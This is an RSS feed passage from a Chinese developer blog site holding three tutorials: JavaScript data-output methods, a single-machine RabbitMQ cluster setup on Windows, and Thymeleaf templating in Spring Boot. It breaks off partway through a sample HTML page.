<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>JavaScript中常用的数据输出方式解析 - 乱了夏天蓝了海</title>
<link>http://www.cnblogs.com/menglong1214/p/10359288.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/menglong1214/p/10359288.html</guid>
<description>&lt;p&gt;在js中，一般使用如下几种方式进行数据的输出：&lt;/p&gt;
&lt;p&gt;1. 在浏览器的控制台输出&lt;/p&gt;
&lt;p&gt;　浏览器F12打开浏览器控制台（一般前端开发人员必备浏览器为谷歌浏览器，下面就以谷歌浏览器为例对控制台尽心解析）；&lt;/p&gt;
&lt;p&gt;　1.1 Elements : 页面中的元素都在这个里面，经常用来调式页面的样式&lt;/p&gt;
&lt;p&gt;    1.2 Network : 包含了所有的资源文件（html、css、js、图片、向后台请求的数据接口等），并告诉我们每一个文件加载完成的事件；这样我们可以针对加载时间过长的资源进行相关优化&lt;/p&gt;
&lt;p&gt;　 1.3 Sources : 包含了我们项目中的html、js、css所有的源代码，很多程序员扒一些优秀网站代码的时候就用到了它&lt;/p&gt;
&lt;p&gt;　  1.4 Resources : 当前网站本地存储的数据（cookie、localStorage、sessionStorage）&lt;/p&gt;
&lt;p&gt;　  1.5 Console : 当前页面向控制台输出的数据就在这里显示了&lt;/p&gt;
&lt;p&gt;　  1.6 Toggle device toolbar ： 控制台左上角有一个手机、PC转换图标按钮，单击可以进入手机端模拟器，这里有模拟各种主流手机型号的手机尺寸的选项，也可以自己自定义添加对应的手机尺寸；我们的移动端开发就是在这个模拟器中完成的&lt;/p&gt;
&lt;p&gt;　  1.7 我们还可以利用控制台对js代码加断点进行页面bug调试　　&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1387891/201902/1387891-20190210145216613-617522340.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;好了，言归正传。上面我们对控制台有了一个深刻的了解，那么怎么在浏览器的控制台进行数据的输出呢？&lt;/p&gt;
&lt;p&gt;　　console.log();&lt;/p&gt;
&lt;p&gt;　　console.info();&lt;/p&gt;
&lt;p&gt;　　console.debug();&lt;/p&gt;

&lt;p&gt;　　console.warn();//输出警告信息&lt;/p&gt;
&lt;p&gt;　　console.error();//输出错误信息&lt;/p&gt;
&lt;p&gt;　　console.dir();//输出一个对象的详细信息&lt;/p&gt;

&lt;p&gt;　　console.table();//将json数据按照表格的形式输出，这样在查看结构时能够更加的清晰直观&lt;/p&gt;

&lt;p&gt;2.  向页面中某个元素中写入内容&lt;/p&gt;
&lt;p&gt;　　element.innerHTML、element.innerTex&lt;/p&gt;
&lt;p&gt;　　示例：　　　&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;var&lt;/span&gt;  oEle = document.getElementById(''oId&quot;&lt;span&gt;);   
oEle.innerHTML = &lt;/span&gt;&quot;&amp;lt;strong&amp;gt;加点料，更直观！！&amp;lt;/strong&amp;gt;&quot;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　上面两个个用法相同，那么它们有什么区别呢？&lt;/p&gt;
&lt;p&gt;　　1&amp;gt;. firefox（火狐）浏览器中不支持innerText，而innerHTML则不存在浏览器兼容性问题。&lt;/p&gt;
&lt;p&gt;　　2&amp;gt;  innerText只能添加文本，即使有html标签，也不能有效识别，而是当作文本写入到元素中；而innerHTML不仅可以添加文字，还可以添加html标签&lt;/p&gt;
&lt;p&gt;　　3&amp;gt; 一般在js项目中，开发人员统一使用innerHTML，基本上不会使用innerText&lt;/p&gt;

&lt;p&gt;3. 在页面中弹出需要显示的内容&lt;/p&gt;
&lt;p&gt;　　window.alert();  //j警告框，确保用户收到消息&lt;/p&gt;
&lt;p&gt;　　window.confirm(); //确认框，返回用户操作的布尔值&lt;/p&gt;
&lt;p&gt;　　window.prompt(); //提示框，根据给出的提示让用户输入信息并返回&lt;/p&gt;
&lt;p&gt;　　提示：上面三个，前面的window可以省略，直接使用alert() 、 confirm() 、 prompt()&lt;/p&gt;
&lt;p&gt;4. 向页面中直接输出内容&lt;/p&gt;
&lt;p&gt;　　document.write();&lt;/p&gt;
&lt;p&gt;　　提示：相对于上面三种数据输出方式，一般情况下不建议使用第4种；第4种可以用来向页面种添加一个广告&lt;/p&gt;

&lt;p&gt;以上就是今天要讲的，数据输出的几种方式，你学会了吗？更多精彩内容请关注下面公众号，吃喵的小鱼干！！内容不定时更新&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1387891/201902/1387891-20190210152954875-564132803.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;






</description>
<pubDate>Sun, 10 Feb 2019 07:30:00 +0000</pubDate>
<dc:creator>乱了夏天蓝了海</dc:creator>
<og:description>在js中，一般使用如下几种方式进行数据的输出： 1. 在浏览器的控制台输出 浏览器F12打开浏览器控制台（一般前端开发人员必备浏览器为谷歌浏览器，下面就以谷歌浏览器为例对控制台尽心解析）； 1.1 E</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/menglong1214/p/10359288.html</dc:identifier>
</item>
<item>
<title>RabbitMQ (十三) 集群+单机搭建(window) - 热敷哥</title>
<link>http://www.cnblogs.com/refuge/p/10358543.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/refuge/p/10358543.html</guid>
<description>&lt;p&gt;拜读了网上很多前辈的文章,对RabbitMQ的集群有了一点点认识.&lt;/p&gt;
&lt;p&gt;好多文章都说到,RabbitMQ的集群分为普通集群和镜像集群,有的还加了两种:单机集群和主从集群.&lt;/p&gt;
&lt;p&gt;我看来看去,看了半天,怎么感觉,其实RabbitMQ的集群实际就一种:普通集群.&lt;/p&gt;
&lt;p&gt;至于单机集群,无非是在一台机器上模拟普通集群,&lt;/p&gt;
&lt;p&gt;镜像集群,不过是RabbitMQ的HA方案而已,因为这种集群方式在部署的时候,其实是通过配置参数,让队列可以&quot;真正的&quot;在多个节点上存储.(而普通集群,队列实际只会存储在一个节点).&lt;/p&gt;
&lt;p&gt;主从集群,则是在镜像集群的基础上,加一层负载均衡而已.&lt;/p&gt;
&lt;p&gt;个人愚见,也许不对.&lt;/p&gt;

&lt;p&gt;RabbitMQ的集群的设计目的是在增加更多节点时,能线性的增加性能（CPU,内存）和容量（内存,磁盘）.同时,一个节点宕机了,其他节点依然可以提供 RabbitMQ 的服务.&lt;/p&gt;
&lt;p&gt;所以,&lt;span&gt;队列的完整数据&lt;/span&gt;只会保存在创建它的那个节点上,其他节点只会保存该队列的元数据和一个指向这个队列的指针而已. &lt;/p&gt;
&lt;p&gt;一个队列的完整数据包括队列的元数据和队列的内容:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1189148/201902/1189148-20190210131124173-446975755.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;RabbitMQ一共有4种类型的元数据,并且,RabbitMQ集群会始终同步这4种元数据.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;队列元数据：队列的名称和声明队列时设置的属性(是否持久化、是否自动删除、队列所属的节点)&lt;/li&gt;
&lt;li&gt;交换机元数据：交换机的名称、类型、属性(是否持久化等)&lt;/li&gt;
&lt;li&gt;绑定元数据：一张简单的表格展示了如何将消息路由到队列.包含的列有 交换机名称、交换机类型、路由键、队列名称等&lt;/li&gt;
&lt;li&gt;vhost元数据：为vhost内队列、交换机和绑定提供命名空间和安全属性&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;因此，当用户访问其中任何一个RabbitMQ节点时,通过rabbitmqctl查询到的queue,user,exchange,vhost等信息都是相同的.&lt;/p&gt;
&lt;p&gt;下图是一个有3个节点的集群,可以看到,消息保存在节点1.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1189148/201902/1189148-20190210133201144-1821484150.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;当消费者从节点2获取消息时,RabbitMQ 会把节点1的消息取出来,传递到节点2,再发送给消费者.这种方式的最大问题在于,如果节点1宕机了,那么节点2和节点3就无法获取到节点1中还未消费的消息了.&lt;/p&gt;
&lt;p&gt;如果做了队列持久化及消息持久化,那么必须等到节点1恢复后,才能被消费,并且在节点1恢复之前,其它节点不能再创建节点1已经创建过的队列;&lt;/p&gt;
&lt;p&gt;如果队列没有持久化,消息就会失丢.&lt;/p&gt;
&lt;p&gt;因此,这种默认的集群模式更适合非持久化队列,只有该队列是非持久话的,客户端才能重新连接到集群里的其他节点,并重新创建该队列.假如该队列是持久化的,那么只能将故障节点恢复起来.否则,永远无法创建同名的队列.&lt;/p&gt;
&lt;p&gt;为了证明上面说的话,我们通过搭建一个单机集群,来模拟这个场景 .&lt;/p&gt;

&lt;h2&gt;1.配置Hosts节点&lt;/h2&gt;
&lt;p&gt;127.0.0.1 node1&lt;br/&gt;127.0.0.1 node2&lt;/p&gt;
&lt;h2&gt;2.复制两份 RabbitMQ ,分别取名&quot;-1&quot;,&quot;-2&quot;&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1189148/201902/1189148-20190210135436353-527274055.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里我们约定 &quot;-1&quot; 是 node1 的 RabbitMQ,&quot;-2&quot;是 node2 的 RabbitMQ.&lt;/p&gt;
&lt;h2&gt;3.修改 node1 的 rabbitmq-env.bat 文件&lt;/h2&gt;
&lt;p&gt;文件路径 : rabbitmq_server-3.7.10-1\sbin\rabbitmq-env.bat&lt;/p&gt;
&lt;p&gt;在 16 行加如下配置:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;set&lt;/span&gt; RABBITMQ_CONFIG_FILE=!RABBITMQ_HOME!\etc\rabbitmq-&lt;span&gt;node1
&lt;/span&gt;&lt;span&gt;set&lt;/span&gt; RABBITMQ_BASE=!RABBITMQ_BASE!\rabbitmq-&lt;span&gt;cluster
&lt;/span&gt;&lt;span&gt;set&lt;/span&gt; RABBITMQ_NODENAME=&lt;span&gt;rabbit1@node1
&lt;/span&gt;&lt;span&gt;set&lt;/span&gt; RABBITMQ_NODE_PORT=&lt;span&gt;5672&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;再上个图,清楚些.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1189148/201902/1189148-20190210140059465-1660300892.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;注意第19行, 是 rabbit1@node1 ,不是 rabbit@node1 ,单机集群,@前面一定要不一样,否则会&quot;痛不欲生&quot;...&lt;/p&gt;
&lt;h2&gt;4.修改 node1 的 rabbitmq-node1.config 文件&lt;/h2&gt;
&lt;p&gt;首先进入 rabbitmq_server-3.7.10-1\etc 文件夹,安装的时候会有一个官方示例文件 : rabbitmq.config.example&lt;/p&gt;
&lt;p&gt;复制一份,改个名 : rabbitmq-node1.config&lt;/p&gt;
&lt;p&gt;在 542 行加如下配置:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
   {listener,[{port,&lt;span&gt;15672&lt;/span&gt;&lt;span&gt;},
   {ip,&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;127.0.0.1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;},
   {ssl,&lt;/span&gt;&lt;span&gt;false&lt;/span&gt;}]}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;注意,我的 RabbitMQ 版本是 3.7.10 ,版本不一样,行数不一样,截个图,就是在这几行注释下面 :&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1189148/201902/1189148-20190210140555289-661954011.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;5.启动 node1&lt;/h2&gt;
&lt;h3&gt;1)关闭启动的 RabbitMQ&lt;/h3&gt;
&lt;p&gt;由于电脑上已经以window服务的方式启动了RabbitMQ,为了方便演示单机集群的搭建,所以我们需要将它关闭掉.&lt;/p&gt;
&lt;p&gt;rabbitmq-service stop&lt;/p&gt;
&lt;p&gt;,&lt;img src=&quot;https://img2018.cnblogs.com/blog/1189148/201902/1189148-20190210141309786-60417933.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;2)启动 node 1 的 RabbitMQ&lt;/h3&gt;
&lt;p&gt;进入 node1 的 sbin 文件夹,也就是 rabbitmq_server-3.7.10-1\sbin 文件夹,然后我们以后台应用的方式启动.&lt;/p&gt;
&lt;p&gt;rabbitmq-server -detached&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1189148/201902/1189148-20190210143431647-494703880.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;验证一下:&lt;/p&gt;
&lt;p&gt;在浏览器地址栏输入 http://localhost:15672/#/ &lt;/p&gt;
&lt;p&gt;如果没有启动管理后台插件,需要先启动它 : rabbitmq-plugins enable rabbitmq_management (由于之前已经启动过了,所以我这里就不需要再启动了)&lt;/p&gt;
&lt;p&gt;默认的账号密码都是 guest&lt;/p&gt;
&lt;p&gt;在管理后台可以看到,node1 已经成功启动了.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1189148/201902/1189148-20190210143634286-595980457.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;6.修改 node2 的配置文件&lt;/h2&gt;
&lt;p&gt;按照第3,4步的方式修改,只是把管理后台的端口由 15672 改成 15673,当然,文件名要改成 rabbitmq-node2.config&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
   {listener,[{port,&lt;span&gt;15673&lt;/span&gt;&lt;span&gt;},
   {ip,&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;127.0.0.1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;},
   {ssl,&lt;/span&gt;&lt;span&gt;false&lt;/span&gt;}]}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;rabbitmq-env.bat 文件修改如下,红色标注,特别注意 rabbit2@node2&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;set&lt;/span&gt; RABBITMQ_CONFIG_FILE=!RABBITMQ_HOME!\etc\rabbitmq-&lt;span&gt;node2
&lt;/span&gt;&lt;span&gt;set&lt;/span&gt; RABBITMQ_BASE=!RABBITMQ_BASE!\rabbitmq-&lt;span&gt;cluster
&lt;/span&gt;&lt;span&gt;set&lt;/span&gt; RABBITMQ_NODENAME=&lt;span&gt;rabbit2@node2
&lt;/span&gt;&lt;span&gt;set&lt;/span&gt; RABBITMQ_NODE_PORT=&lt;span&gt;5673&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;7.启动 node2&lt;/h2&gt;
&lt;p&gt;参考第5步的第2小步启动.&lt;/p&gt;
&lt;p&gt;验证一下:&lt;/p&gt;
&lt;p&gt;在浏览器地址栏输入 http://localhost:15673/#/ &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1189148/201902/1189148-20190210145559772-273078985.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;没毛病!&lt;/p&gt;
&lt;h2&gt;8.将 node2 加入集群&lt;/h2&gt;
&lt;h3&gt;1)关闭 node2&lt;/h3&gt;
&lt;p&gt;rabbitmqctl stop&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1189148/201902/1189148-20190210145842382-870103277.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;2)将 node2 加入到 node1&lt;/h3&gt;
&lt;p&gt;rabbitmqctl join_cluster rabbit1@node1&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1189148/201902/1189148-20190210150313677-744819062.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;3)启动 node2&lt;/h3&gt;
&lt;p&gt;rabbitmq-server -detached&lt;/p&gt;
&lt;h3&gt;4)打开 15672 和 15673 管理后台验证:&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1189148/201902/1189148-20190210151333107-126166640.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1189148/201902/1189148-20190210152312702-878361132.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;参考:&lt;/p&gt;
&lt;p&gt;https://blog.csdn.net/vbirdbest/article/details/78723467&lt;/p&gt;
&lt;p&gt;https://blog.csdn.net/fgf00/article/details/79558498&lt;/p&gt;
</description>
<pubDate>Sun, 10 Feb 2019 07:26:00 +0000</pubDate>
<dc:creator>热敷哥</dc:creator>
<og:description>拜读了网上很多前辈的文章,对RabbitMQ的集群有了一点点认识. 好多文章都说到,RabbitMQ的集群分为普通集群和镜像集群,有的还加了两种:单机集群和主从集群. 我看来看去,看了半天,怎么感觉,</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/refuge/p/10358543.html</dc:identifier>
</item>
<item>
<title>SpringBoot集成Thymeleaf模板引擎 - javahih</title>
<link>http://www.cnblogs.com/mzq123/p/10359234.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/mzq123/p/10359234.html</guid>
<description>&lt;p&gt;&lt;strong&gt;简单介绍&lt;/strong&gt;&lt;br/&gt;目前在JavaEE领域有几中比较常用的模板引擎，分别是Jsp、Velocity、Freemarker、Thymeleaf，对Freemark语法不是特别熟悉，不过对于前端页面渲染效率来说，jsp其实还是最快的，Velocity次之。Thymeleaf虽然渲染效率不是很快，但是语法方面是比较轻巧的，Thymeleaf语法比Velocity轻巧，但是渲染效率不如Velocity&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;maven配置&lt;/strong&gt;&lt;br/&gt;因为引入了SpringBoot的parent工程，所以不需要写版本号&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;!-- Themeleaf --&amp;gt;
    &amp;lt;dependency&amp;gt;
      &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
      &amp;lt;artifactId&amp;gt;spring-boot-starter-thymeleaf&amp;lt;/artifactId&amp;gt;
    &amp;lt;/dependency&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;application.yml配置&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#添加Thymeleaf配置
  thymeleaf:
    cache: false
    prefix: classpath:/templates/
    suffix: .html
    mode: HTML5
    encoding: UTF-8
    content-type: text/html&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;application.yml：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;server:
  port: 8081
#logging:
#  config: classpath:logback_spring.xml.bat
#  level:
#    com.muses.taoshop: debug
#  path: /data/logs

spring:
  datasource:

    # 主数据源
    shop:
      url: jdbc:mysql://127.0.0.1:3306/taoshop?autoReconnect=true&amp;amp;useUnicode=true&amp;amp;characterEncoding=utf8&amp;amp;characterSetResults=utf8&amp;amp;useSSL=false
      username: root
      password: root

    driver-class-name: com.mysql.jdbc.Driver
    type: com.alibaba.druid.pool.DruidDataSource

    # 连接池设置
    druid:
      initial-size: 5
      min-idle: 5
      max-active: 20
      # 配置获取连接等待超时的时间
      max-wait: 60000
      # 配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒
      time-between-eviction-runs-millis: 60000
      # 配置一个连接在池中最小生存的时间，单位是毫秒
      min-evictable-idle-time-millis: 300000
      # Oracle请使用select 1 from dual
      validation-query: SELECT 'x'
      test-while-idle: true
      test-on-borrow: false
      test-on-return: false
      # 打开PSCache，并且指定每个连接上PSCache的大小
      pool-prepared-statements: true
      max-pool-prepared-statement-per-connection-size: 20
      # 配置监控统计拦截的filters，去掉后监控界面sql无法统计，'wall'用于防火墙
      filters: stat,wall,slf4j
      # 通过connectProperties属性来打开mergeSql功能；慢SQL记录
      connection-properties: druid.stat.mergeSql=true;druid.stat.slowSqlMillis=5000
      # 合并多个DruidDataSource的监控数据
      use-global-data-source-stat: true

#  jpa:
#    database: mysql
#    hibernate:
#      show_sql: true
#      format_sql: true
#      ddl-auto: none
#      naming:
#        physical-strategy: org.hibernate.boot.entity.naming.PhysicalNamingStrategyStandardImpl

#  mvc:
#    view:
#      prefix: /WEB-INF/jsp/
#      suffix: .jsp

  #添加Thymeleaf配置
  thymeleaf:
    cache: false
    prefix: classpath:/templates/
    suffix: .html
    mode: HTML5
    encoding: UTF-8
    content-type: text/html

  #Jedis配置
#  jedis :
#    pool :
#      host : 127.0.0.1
#      port : 6379
#      password : redispassword
#      timeout : 0
#      config :
#        maxTotal : 100
#        maxIdle : 10
#        maxWaitMillis : 100000



&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;添加html文件&lt;/strong&gt;&lt;br/&gt;在resources资源文件夹下面新建一个templates文件夹，所有的html文件都丢在这里，静态资源文件也丢在resources资源文件夹下面&lt;/p&gt;
&lt;p&gt;新建一个html文件，然后注意加上&lt;code&gt;&amp;lt;html xmlns:th=&quot;http://www.thymeleaf.org&quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;注意Thymeleaf语法要求比较严格 &lt;code&gt;&amp;lt;meta charset=&quot;utf-8&quot; &amp;gt;&lt;/code&gt;，不如这样写是不可以的，必须加上斜杠的，&lt;code&gt;&amp;lt;meta charset=&quot;utf-8&quot; /&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Thymeleaf简单例子&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;遍历后台数据&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;!--最新上架--&amp;gt;
        &amp;lt;div class=&quot;first-pannel clearfix&quot;&amp;gt;
            &amp;lt;div class=&quot;index-f clearfix&quot;&amp;gt;
                &amp;lt;h3 class=&quot;index-f-head&quot;&amp;gt; 最新上架 &amp;lt;span&amp;gt;每天都有上新，每天都有惊喜&amp;lt;/span&amp;gt; &amp;lt;/h3&amp;gt;
                &amp;lt;div class=&quot;index-f-body&quot;&amp;gt;
                    &amp;lt;div class=&quot;top-sales newProduct&quot;&amp;gt;
                        &amp;lt;ul class=&quot;top-sales-list clearfix&quot;&amp;gt;
                            &amp;lt;li class=&quot;top-sales-item newProduct&quot; th:each=&quot;item : ${items}&quot;&amp;gt;
                                &amp;lt;p class=&quot;item-img&quot;&amp;gt; &amp;lt;a th:href=&quot;@{'/portal/item/toDetail/'+${item.spuId}+'/'+${item.skuId}}&quot;&amp;gt;&amp;lt;img th:src=&quot;@{${item.imgPath}}&quot; /&amp;gt;&amp;lt;/a&amp;gt; &amp;lt;/p&amp;gt;
                                &amp;lt;p class=&quot;item-buss&quot;&amp;gt;&amp;lt;a th:href=&quot;@{'/portal/item/toDetail/'+${item.spuId}+'/'+${item.skuId}}&quot;&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
                                &amp;lt;p class=&quot;item-name spec&quot;&amp;gt;&amp;lt;a th:href=&quot;@{'/portal/item/toDetail/'+${item.spuId}+'/'+${item.skuId}}&quot; th:text=&quot;${item.itemName}&quot;&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
                                &amp;lt;p class=&quot;item-price spec&quot;&amp;gt;&amp;lt;em th:text=&quot;${item.mPrice}&quot;&amp;gt;&amp;lt;/em&amp;gt;元&amp;lt;/p&amp;gt;
                            &amp;lt;/li&amp;gt;
                        &amp;lt;/ul&amp;gt;
                    &amp;lt;/div&amp;gt;
                &amp;lt;/div&amp;gt;
            &amp;lt;/div&amp;gt;
        &amp;lt;/div&amp;gt;
        &amp;lt;!--最新上架//--&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;引入文件&lt;br/&gt;Thymeleaf引入另外一个html文件可以使用th:replace或者th:include，&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;!--topBar--&amp;gt;
    &amp;lt;div class=&quot;topBar&quot; th:replace=&quot;/top_bar :: .topBar&quot;&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;!--//topBar--&amp;gt;
    &amp;lt;!--headerMain--&amp;gt;
    &amp;lt;div class=&quot;headerMain layout clearfix&quot; th:replace=&quot;/header_main :: .headerMain&quot;&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;!--//headerMain--&amp;gt;
    &amp;lt;!--headerNav--&amp;gt;
    
    &amp;lt;div class=&quot;headerNav&quot; th:replace=&quot;/index_header_nav :: .headerNav&quot;&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;!--//headerNav--&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Img便签src&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; &amp;lt;img th:src=&quot;@{/static/images/rachange_ad.jpg}&quot; /&amp;gt;
链接&amp;lt;a&amp;gt;便签
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;a&gt;&lt;img/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;静态资源使用&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;link th:href=&quot;@{/static/css/public.css}&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&amp;gt;
    &amp;lt;link th:href=&quot;@{/static/css/index.css}&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&amp;gt;
    &amp;lt;script type=&quot;text/javascript&quot; th:src=&quot;@{/static/js/jquery-1.3.2.min.js}&quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script type=&quot;text/javascript&quot; th:src=&quot;@{/static/js/html5.js}&quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script type=&quot;text/javascript&quot; th:src=&quot;@{/static/js/popbox.js}&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;给出一个html页面例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;!DOCTYPE HTML&amp;gt;
&amp;lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;
      xmlns:th=&quot;http://www.thymeleaf.org&quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&quot;utf-8&quot; /&amp;gt;
    &amp;lt;title&amp;gt;电商门户网站&amp;lt;/title&amp;gt;
    &amp;lt;link th:href=&quot;@{/static/css/public.css}&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&amp;gt;
    &amp;lt;link th:href=&quot;@{/static/css/index.css}&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&amp;gt;
    &amp;lt;script type=&quot;text/javascript&quot; th:src=&quot;@{/static/js/jquery-1.3.2.min.js}&quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script type=&quot;text/javascript&quot; th:src=&quot;@{/static/js/html5.js}&quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script type=&quot;text/javascript&quot; th:src=&quot;@{/static/js/popbox.js}&quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;style type=&quot;text/css&quot;&amp;gt;
        .item-list { display: none; position: absolute; width: 705px; min-height: 200px; _height: 200px; background: #FFF; left: 198px; box-shadow: 0px 0px 10px #DDDDDD; border: 1px solid #DDD; top: 3px; z-index: 1000000; }
        /* Remove Float */
        .clear { display: block; height: 0; overflow: hidden; clear: both; }
        .clearfix:after { content: '\20'; display: block; height: 0; clear: both; }
        .clearfix { *zoom:1;
        }
        .hover { position: relative; z-index: 1000000000; background: #FFF; border-color: #DDD; border-width: 1px 0px; border-style: solid; }
    &amp;lt;/style&amp;gt;

&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;!--header--&amp;gt;
&amp;lt;header class=&quot;header&quot;&amp;gt;
